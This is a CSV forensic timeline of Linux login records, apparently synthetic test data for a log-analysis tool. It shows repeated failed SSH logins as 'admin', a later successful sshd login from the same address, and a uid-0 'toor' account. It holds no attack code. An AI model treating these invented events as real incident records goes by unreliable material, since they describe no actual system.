datetime_utc,date,time,source,event_type,user,host,description,metadata,raw
2024-09-10T20:26:40+00:00,2024-09-10,20:26:40,wtmp,system_boot,reboot,5.15.0,wtmp: type=BOOT_TIME user=reboot line=~ host=5.15.0,"{""type"": ""BOOT_TIME"", ""pid"": 0, ""line"": ""~"", ""host"": ""5.15.0"", ""session"": 0}",
2024-09-12T00:13:20+00:00,2024-09-12,00:13:20,wtmp,session_open,alice,192.0.2.10,wtmp: type=USER_PROCESS user=alice line=pts/0 host=192.0.2.10,"{""type"": ""USER_PROCESS"", ""pid"": 8000, ""line"": ""pts/0"", ""host"": ""192.0.2.10"", ""session"": 0}",
2024-09-12T00:13:20+00:00,2024-09-12,00:13:20,utmp,system_boot,reboot,5.15.0,utmp: type=BOOT_TIME user=reboot line=~ host=5.15.0,"{""type"": ""BOOT_TIME"", ""pid"": 0, ""line"": ""~"", ""host"": ""5.15.0"", ""session"": 0}",
2024-09-12T00:13:20+00:00,2024-09-12,00:13:20,lastlog,last_login,backup,198.51.100.7,lastlog: user=backup (uid=34) line=pts/2 host=198.51.100.7,"{""uid"": 34, ""line"": ""pts/2"", ""host"": ""198.51.100.7""}",
2024-09-12T03:00:00+00:00,2024-09-12,03:00:00,wtmp,session_close,,,wtmp: type=DEAD_PROCESS user=- line=pts/0 host=-,"{""type"": ""DEAD_PROCESS"", ""pid"": 8000, ""line"": ""pts/0"", ""host"": """", ""session"": 0}",
2024-09-12T03:50:00+00:00,2024-09-12,03:50:00,btmp,login_failed,admin,192.0.2.55,btmp: type=USER_PROCESS user=admin line=ssh host=192.0.2.55,"{""type"": ""USER_PROCESS"", ""pid"": 7000, ""line"": ""ssh"", ""host"": ""192.0.2.55"", ""session"": 0}",
2024-09-12T03:50:00+00:00,2024-09-12,03:50:00,lastlog,last_login,toor,192.0.2.10,lastlog: user=toor (uid=0) line=pts/0 host=192.0.2.10,"{""uid"": 0, ""line"": ""pts/0"", ""host"": ""192.0.2.10""}",
2024-09-12T03:50:00.123000+00:00,2024-09-12,03:50:00,audit.log,audit_user_login,0,,USER_LOGIN acct=? res=? addr=- terminal=-,"{""audit_type"": ""USER_LOGIN"", ""type"": ""USER_LOGIN"", ""msg"": ""op=login id=1000 exe=\""/usr/sbin/sshd\"" hostname=192.0.2.55 addr=192.0.2.55 terminal=ssh res=success"", ""pid"": ""1234"", ""uid"": ""0"", ""auid"": ""1000"", ""ses"": ""5""}","type=USER_LOGIN msg=audit(1726113000.123:100): pid=1234 uid=0 auid=1000 ses=5 msg='op=login id=1000 exe=""/usr/sbin/sshd"" hostname=192.0.2.55 addr=192.0.2.55 terminal=ssh res=success'"
2024-09-12T03:50:02+00:00,2024-09-12,03:50:02,btmp,login_failed,admin,192.0.2.55,btmp: type=USER_PROCESS user=admin line=ssh host=192.0.2.55,"{""type"": ""USER_PROCESS"", ""pid"": 7001, ""line"": ""ssh"", ""host"": ""192.0.2.55"", ""session"": 0}",
2024-09-12T03:50:04+00:00,2024-09-12,03:50:04,btmp,login_failed,admin,192.0.2.55,btmp: type=USER_PROCESS user=admin line=ssh host=192.0.2.55,"{""type"": ""USER_PROCESS"", ""pid"": 7002, ""line"": ""ssh"", ""host"": ""192.0.2.55"", ""session"": 0}",
2024-09-12T03:50:06+00:00,2024-09-12,03:50:06,btmp,login_failed,admin,192.0.2.55,btmp: type=USER_PROCESS user=admin line=ssh host=192.0.2.55,"{""type"": ""USER_PROCESS"", ""pid"": 7003, ""line"": ""ssh"", ""host"": ""192.0.2.55"", ""session"": 0}",
2024-09-12T03:50:08+00:00,2024-09-12,03:50:08,btmp,login_failed,admin,192.0.2.55,btmp: type=USER_PROCESS user=admin line=ssh host=192.0.2.55,"{""type"": ""USER_PROCESS"", ""pid"": 7004, ""line"": ""ssh"", ""host"": ""192.0.2.55"", ""session"": 0}",
